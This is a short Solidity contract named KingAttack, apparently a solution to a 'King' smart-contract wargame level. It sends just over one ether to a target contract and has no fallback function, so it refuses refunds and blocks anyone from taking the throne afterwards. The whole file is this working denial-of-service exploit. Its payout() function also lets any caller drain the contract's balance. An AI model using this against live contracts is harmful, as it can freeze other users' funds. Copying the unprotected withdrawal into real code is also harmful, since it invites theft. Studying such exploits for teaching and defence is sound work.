pragma solidity ^0.4.18;

contract KingAttack {
    
    address public add;
    
    function KingAttack(address _king) public payable {
        add = _king;
    }
    
    function go() public {
        add.call.value(1001000000000000000)();
    }
    
    function payout() public {
        msg.sender.transfer(this.balance);
    }
}